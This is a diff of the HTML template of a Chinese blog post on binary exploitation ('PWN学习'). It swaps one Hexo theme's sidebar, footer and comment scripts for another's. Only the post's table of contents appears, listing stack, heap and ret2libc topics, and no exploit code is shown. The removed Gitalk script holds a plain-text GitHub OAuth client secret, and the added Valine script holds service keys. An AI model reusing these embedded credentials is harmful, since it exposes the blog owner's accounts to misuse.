class="nav-text">格式化字符串漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆"><span class="nav-number">9.</span> <span class="nav-text">堆</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是堆"><span class="nav-number">9.1.</span> <span class="nav-text">什么是堆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆管理器"><span class="nav-number">9.2.</span> <span class="nav-text">堆管理器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arena"><span class="nav-number">9.2.1.</span> <span class="nav-text">arena</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk"><span class="nav-number">9.2.2.</span> <span class="nav-text">chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloced-chunk"><span class="nav-number">9.2.2.1.</span> <span class="nav-text">malloced chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#free-chunk"><span class="nav-number">9.2.2.2.</span> <span class="nav-text">free chunk</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-number">9.2.3.</span> <span class="nav-text">bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache"><span class="nav-number">9.2.3.1.</span> <span class="nav-text">tcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbins"><span class="nav-number">9.2.3.2.</span> <span class="nav-text">fastbins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsorted-bin"><span class="nav-number">9.2.3.3.</span> <span class="nav-text">unsorted bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#small-bins"><span class="nav-number">9.2.3.4.</span> <span class="nav-text">small bins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#large-bins"><span class="nav-number">9.2.3.5.</span> <span class="nav-text">large bins</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆漏洞"><span class="nav-number">10.</span> <span class="nav-text">堆漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具学习"><span class="nav-number">11.</span> <span class="nav-text">工具学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools"><span class="nav-number">11.1.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb"><span class="nav-number">11.2.</span> <span class="nav-text">gdb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA"><span class="nav-number">11.3.</span> <span class="nav-text">IDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadget"><span class="nav-number">11.4.</span> <span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#one-gadget"><span class="nav-number">11.5.</span> <span class="nav-text">one_gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#练习题"><span class="nav-number">12.</span> <span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">12.1.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text-1"><span class="nav-number">12.1.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode-1"><span class="nav-number">12.1.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall"><span class="nav-number">12.1.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1"><span class="nav-number">12.1.4.</span> <span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2"><span class="nav-number">12.1.5.</span> <span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#retlibc3"><span class="nav-number">12.1.6.</span> <span class="nav-text">retlibc3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2-x64"><span class="nav-number">12.1.7.</span> <span class="nav-text">pwn2_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-number">12.1.8.</span> <span class="nav-text">pwn3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3-x64"><span class="nav-number">12.1.9.</span> <span class="nav-text">pwn3_x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmtstr1"><span class="nav-number">12.1.10.</span> <span class="nav-text">fmtstr1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmstr2"><span class="nav-number">12.1.11.</span> <span class="nav-text">fmstr2</span></a></li></ol></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Pz1o"
-      src="/images/timg.jpeg">
-  <p class="site-author-name" itemprop="name">Pz1o</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">14</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">16</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
       </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Pz1o</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-    <span title="站点总字数">104k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="站点阅读时长">1:34</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
 </div>
 
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
 
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
 
-
-
-
-
-
-      </div>
     </footer>
   </div>
 
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            逆向工程核心原理读书笔记
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CUMT2020华为杯</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
+    app_key: "FL93w3BBbF9lxiR8X1HI58En",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020
+        <i class="ri-heart-fill heart_icon"></i> Pz1o
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/canvas_lines.min.js"></script>
-
-
+  <div class="logo">
+    <a href="/"><img src="/images/avatar.jpg" alt="Pz1o"></a>
+  </div>
   
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
 
 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
 
 
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="/js/tocbot.min.js"></script>
 
 <script>
-NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
-    var gitalk = new Gitalk({
-      clientID    : '39c3461c126ff179de81',
-      clientSecret: '07cc5b1c7e860dc2430617d4e53c6d8610d1e09f',
-      repo        : 'comments',
-      owner       : 'pz1o',
-      admin       : ['pz1o'],
-      id          : 'a749f827693b0c21c6381846153b7c96',
-        language: 'zh-CN',
-      distractionFreeMode: true
-    });
-    gitalk.render('gitalk-container');
-  }, window.Gitalk);
-});
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
 </script>
 
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
+
 </html>
